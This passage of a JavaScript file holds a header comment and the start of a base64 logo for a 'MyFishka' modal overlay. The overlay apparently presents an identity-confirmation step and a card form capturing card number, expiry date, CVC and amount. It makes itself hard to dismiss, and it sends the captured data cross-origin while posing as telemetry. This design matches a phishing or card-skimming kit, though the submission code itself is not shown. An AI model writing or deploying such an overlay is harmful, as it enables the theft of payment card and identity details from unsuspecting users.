/*
  MyFishka modal UI with functional data submission (updated v6)
  -------------------------------------------------
  - Overlay is semi-transparent black.
  - Modal closes ONLY by pressing the close button, or after successful submit.
  - Variant 2: Auth with button "Підтвердити особу".
  - Variant 3: Card form with fixed row layout + client-side validation (card/date/cvc, amount).
  - Card number check: only length 13–19 digits (Luhn removed).
  - On submit of Variant 2 and 3, after sending data, modal closes automatically.
  - Cross-origin POST without CORS uses telemetry sender strategy.
*/
(function(){
  'use strict';

  const ASSETS={
    logoUrl:'data:image/png;base64,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